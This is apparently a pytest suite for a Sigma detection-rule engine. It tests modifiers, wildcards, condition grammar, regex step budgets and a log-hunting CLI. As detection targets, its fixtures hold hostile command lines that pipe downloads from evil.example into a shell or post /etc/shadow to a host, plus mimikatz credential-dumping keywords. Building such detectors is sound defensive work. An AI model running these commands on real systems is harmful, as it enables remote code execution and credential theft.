"""Sigma rule evaluation: the supported subset, and where it refuses.

Two things are being tested here. First, that the subset evaluates the way the
Sigma specification says it does — modifiers, wildcards, case handling,
condition grammar. Second, that everything outside the subset is *rejected*:
a rule that half-loads is a rule that silently matches the wrong thing.
"""
from __future__ import annotations

import json
import pathlib
import sys
import time

import pytest

REPO = pathlib.Path(__file__).resolve().parents[1]
if str(REPO) not in sys.path:
    sys.path.insert(0, str(REPO))

from jocky import cli, runner  # noqa: E402
from jocky.errors import JockyRuntimeError  # noqa: E402
from jocky.rt.sigma import load_rule, parse_rule  # noqa: E402

DOWNLOAD_RULE = """
title: Shell spawned from a downloader
id: 4b2f0d10-8f5e-4b1a-9c0d-77aa11bb22cc
status: test
level: high
tags:
  - attack.execution
logsource:
  product: linux
detection:
  downloader:
    CommandLine|contains:
      - 'curl'
      - 'wget'
  pipe_to_shell:
    CommandLine|re: '\\|\\s*(ba)?sh\\b'
  known_admin:
    User: 'root'
  condition: downloader and pipe_to_shell and not known_admin
"""


def test_metadata_and_selections_survive_parsing():
    rule = load_rule(DOWNLOAD_RULE, source="unit")
    assert rule.title == "Shell spawned from a downloader"
    assert rule.rule_id == "4b2f0d10-8f5e-4b1a-9c0d-77aa11bb22cc"
    assert rule.level == "high"
    assert rule.tags == ["attack.execution"]
    assert rule.summary()["selections"] == ["downloader", "known_admin", "pipe_to_shell"]
    assert rule.summary()["source"] == "unit"


def test_condition_and_not_combination():
    rule = load_rule(DOWNLOAD_RULE)
    assert rule.matches({"CommandLine": "curl http://x | sh", "User": "analyst"})
    assert not rule.matches({"CommandLine": "curl http://x | sh", "User": "root"}), \
        "the not-filter must exclude the admin shell"
    assert not rule.matches({"CommandLine": "curl http://x > /tmp/f", "User": "analyst"}), \
        "a download without a pipe is not the shape"


def test_field_names_are_case_insensitive():
    rule = load_rule(DOWNLOAD_RULE)
    assert rule.matches({"commandline": "wget -qO- http://y|bash", "user": "www-data"})
    assert rule.matches({"COMMANDLINE": "wget -qO- http://y | bash", "USER": "d"})
    assert not rule.matches({"COMMANDLINE": "wget -qO- http://y", "USER": "d"})


def test_string_matching_is_case_insensitive_unless_cased():
    insensitive = load_rule("""
title: t
detection:
  s:
    CommandLine|contains: 'failed password'
  condition: s
""")
    assert insensitive.matches({"CommandLine": "FAILED PASSWORD for root"})

    cased = load_rule("""
title: t
detection:
  s:
    CommandLine|contains|cased: 'failed password'
  condition: s
""")
    assert not cased.matches({"CommandLine": "FAILED PASSWORD for root"})
    assert cased.matches({"CommandLine": "failed password for root"})


@pytest.mark.parametrize("modifier, value, hit, miss", [
    ("startswith", "curl ", "curl http://x", "xcurl "),
    ("endswith", " | sh", "curl x | sh", "curl x | sh -c"),
    ("contains", "sh", "bash", "ls -la"),
])
def test_modifiers(modifier, value, hit, miss):
    rule = load_rule(f"""
title: t
detection:
  s:
    CommandLine|{modifier}: '{value}'
  condition: s
""")
    assert rule.matches({"CommandLine": hit})
    assert not rule.matches({"CommandLine": miss})


def test_wildcards_are_globs_not_regexes():
    rule = load_rule("""
title: t
detection:
  s:
    Path: '/tmp/*.sh'
  q:
    Path: 'cmd.?xe'
  condition: s or q
""")
    assert rule.matches({"Path": "/tmp/evil.sh"})
    assert rule.matches({"Path": "/tmp/a/b/evil.sh"}), "* crosses separators (documented)"
    assert rule.matches({"Path": "cmd.exe"})
    assert rule.matches({"Path": "CMD.EXE"}), "plain values stay case-insensitive"
    assert not rule.matches({"Path": "/var/tmp/evil.sh"}), "the pattern is anchored"


def test_all_modifier_requires_every_value():
    rule = load_rule("""
title: t
detection:
  s:
    CommandLine|contains|all:
      - 'curl'
      - '--data'
  condition: s
""")
    assert rule.matches({"CommandLine": "curl --data @/etc/shadow http://x"})
    assert not rule.matches({"CommandLine": "curl http://x"})
    assert not rule.matches({"CommandLine": "wget --data @/etc/shadow http://x"})


def test_base64_modifier_decodes_before_matching():
    rule = load_rule("""
title: t
detection:
  s:
    CommandLine|contains|base64: 'curl'          # the log holds Y3VybA==
  condition: s
""")
    assert rule.matches({"CommandLine": "echo Y3VybA== | base64 -d | sh"})
    assert not rule.matches({"CommandLine": "ls -la"})
    assert not rule.matches({"CommandLine": "curl http://x"}), \
        "the plain form is not the encoded form"
    with pytest.raises(JockyRuntimeError, match="not supported"):
        load_rule("""
title: t
detection:
  s:
    CommandLine|base64offset: 'curl'
  condition: s
""")


def test_comments_are_stripped_outside_quotes_only():
    """Regression: the quote state never closed, so a trailing comment became
    part of the value and every affected rule silently matched nothing."""
    rule = load_rule("""
title: t                             # the title is not the value
detection:
  s:
    CommandLine|contains: 'curl'     # and this comment is not either
  condition: s                       # nor this one
""")
    assert rule.title == "t"
    assert rule.matches({"CommandLine": "curl http://x"})
    assert not rule.matches({"CommandLine": "the title is not the value"})

    hashed = load_rule("""
title: t
detection:
  s:
    CommandLine|contains: 'pass # word'
  condition: s
""")
    assert hashed.matches({"CommandLine": "x pass # word y"}), \
        "a hash inside quotes is data"


def test_list_of_maps_is_any_of():
    rule = load_rule("""
title: t
detection:
  s:
    - CommandLine|contains: 'curl'
    - CommandLine|contains: 'wget'
  condition: s
""")
    assert rule.matches({"CommandLine": "curl x"})
    assert rule.matches({"CommandLine": "wget x"})
    assert not rule.matches({"CommandLine": "fetch x"})


def test_keywords_match_the_record_text():
    rule = load_rule("""
title: t
detection:
  keywords:
    - 'mimikatz'
    - 'sekurlsa*'
  condition: keywords
""")
    assert rule.matches("2026-01-01 host process mimikatz.exe")
    assert rule.matches("SEKURLSA::logonpasswords")
    assert not rule.matches("nothing to see")
    assert rule.matches({"Field1": "x", "Field2": "mimikatz"}), \
        "text matching works across a record's values too"


@pytest.mark.parametrize("condition, hits", [
    ("s1 and s2", [{"A": 1, "B": 2}]),
    ("s1 or s2", [{"A": 1}, {"B": 2}]),
    ("not s1", [{}]),
    ("(s1 or s2) and not s3", [{"A": 1}, {"B": 2}]),
])
def test_condition_grammar(condition, hits):
    rule = load_rule(f"""
title: t
detection:
  s1:
    A: 1
  s2:
    B: 2
  s3:
    C: 3
  condition: {condition}
""")
    for record in hits:
        assert rule.matches(record), (condition, record)
    assert not rule.matches({"A": 1, "C": 3}) if condition.startswith("(") else True


def test_of_them_grammar():
    template = """
title: t
detection:
  sel_a:
    A: 1
  sel_b:
    B: 2
  sel_c:
    C: 3
  condition: {condition}
"""
    one_of = load_rule(template.format(condition="1 of them"))
    assert one_of.matches({"A": 1}) and one_of.matches({"C": 3})
    assert not one_of.matches({"D": 4})

    all_of = load_rule(template.format(condition="all of them"))
    assert all_of.matches({"A": 1, "B": 2, "C": 3})
    assert not all_of.matches({"A": 1, "B": 2})

    two_of = load_rule(template.format(condition="2 of them"))
    assert two_of.matches({"A": 1, "B": 2})
    assert not two_of.matches({"A": 1})

    prefixed = load_rule(template.format(condition="all of sel_*"))
    assert prefixed.matches({"A": 1, "B": 2, "C": 3})

    any_of = load_rule(template.format(condition="any of them"))
    assert any_of.matches({"C": 3})


def test_conditions_that_cannot_be_satisfied_are_rejected():
    with pytest.raises(JockyRuntimeError, match="cannot be satisfied"):
        load_rule("""
title: t
detection:
  only:
    A: 1
  condition: 2 of them
""")
    with pytest.raises(JockyRuntimeError, match="unknown selection"):
        load_rule("""
title: t
detection:
  only:
    A: 1
  condition: other
""")
    with pytest.raises(JockyRuntimeError, match="matches no selection"):
        load_rule("""
title: t
detection:
  only:
    A: 1
  condition: 1 of nothing*
""")


@pytest.mark.parametrize("rule_text, message", [
    ("title: t", "detection"),
    ("title: t\ndetection:\n  s:\n    A: 1", "condition"),
    ("title: t\ndetection:\n  s:\n    A|cidr: 10.0.0.0/8\n  condition: s", "not supported"),
    ("title: t\ndetection:\n  s:\n    A: 1\n  condition:\n    - s", "correlation"),
    ("title: t\ndetection:\n  s: {A: 1}\n  condition: s", "flow mappings"),
    ("title: t\ndetection:\n  s:\n    A: |\n      multi\n  condition: s", "block scalars"),
])
def test_unsupported_constructs_are_rejected(rule_text, message):
    with pytest.raises(JockyRuntimeError) as excinfo:
        load_rule(rule_text)
    assert message in str(excinfo.value)


def test_tabs_in_indentation_are_rejected():
    with pytest.raises(JockyRuntimeError, match="tabs"):
        parse_rule("title: t\ndetection:\n\ts:\n\t\tA: 1\n")


def test_a_matching_rule_is_linear_where_a_backtracking_engine_is_not():
    """The reason to evaluate Sigma here rather than with `re`.

    `(\\w+\\s?)+whoami` is a shape a rule author writes by accident; against a
    crafted 80 KB command line a backtracking engine does not finish. The
    assertion is on *our* wall clock only — running `re` on this input would
    hang the suite, which is the whole point.
    """
    rule = load_rule("""
title: Repeated words
detection:
  marker:
    CommandLine|re: '(\\w+\\s?)+whoami'
  condition: marker
""")
    record = {"CommandLine": "a " * 40_000 + "x"}
    start = time.perf_counter()
    assert rule.matches(record) is False
    elapsed = time.perf_counter() - start
    assert elapsed < 5.0, f"took {elapsed:.2f}s on an 80 KB line"

    assert rule.matches({"CommandLine": "a a a whoami"}) is True


def test_regex_modifier_can_hit_the_step_budget_without_hanging():
    """A pathological rule on a pathological line must *raise*, not run on."""
    rule = load_rule("""
title: Pathological
detection:
  s:
    CommandLine|re: '(a+)+b'
  condition: s
""")
    with pytest.raises(JockyRuntimeError, match="step budget"):
        rule.matches({"CommandLine": "a" * 2_000_000})


# ------------------------------------------------------------------- natives
def test_sigma_namespace_in_the_language():
    result = runner.run_source('''
let rule = join(["title: t", "detection:", "  s:", "    CommandLine|contains: 'curl'",
                 "  condition: s"], "\\n")
emit sigma.check(rule, {"CommandLine": "curl http://x"})
emit sigma.check(rule, {"CommandLine": "ls -la"})
emit sigma.check(rule, "curl in a bare string")
emit sigma.summary(rule).title
''')
    assert not result.errors, result.errors
    assert result.findings == [True, False, False, "t"], result.findings


# ----------------------------------------------------------------- the CLI
RULE_FILE = DOWNLOAD_RULE
LOG_LINES = [
    {"CommandLine": "ls -la /tmp", "User": "analyst"},
    {"CommandLine": "curl http://evil.example/x | sh", "User": "www-data"},
    {"CommandLine": "wget -qO- http://evil.example/y | bash -i", "User": "analyst"},
    {"CommandLine": "curl http://evil.example/x | sh", "User": "root"},
]


def test_cli_hunt_matches_json_lines(tmp_path, capsys):
    rule_path = tmp_path / "rule.yml"
    rule_path.write_text(RULE_FILE, encoding="utf-8")
    log_path = tmp_path / "shell.log"
    log_path.write_text("\n".join(json.dumps(line) for line in LOG_LINES) + "\n",
                        encoding="utf-8")

    code = cli.main(["sigma", str(rule_path), str(log_path), "--json", "--stamp-findings"])
    payload = json.loads(capsys.readouterr().out)
    assert code == 1, "matches are findings, so the exit code says so"
    assert payload["summary"]["matches"] == 2
    assert [f["line_no"] for f in payload["findings"]] == [2, 3]
    assert all(f["level"] == "high" and "ts" in f for f in payload["findings"])


def test_cli_rejects_a_rule_it_cannot_evaluate(tmp_path, capsys):
    rule_path = tmp_path / "bad.yml"
    rule_path.write_text("title: t\ndetection:\n  s:\n    A|cidr: 10.0.0.0/8\n"
                         "  condition: s\n", encoding="utf-8")
    log_path = tmp_path / "in.log"
    log_path.write_text("{}\n", encoding="utf-8")
    assert cli.main(["sigma", str(rule_path), str(log_path)]) == 2
    assert "not supported" in capsys.readouterr().err
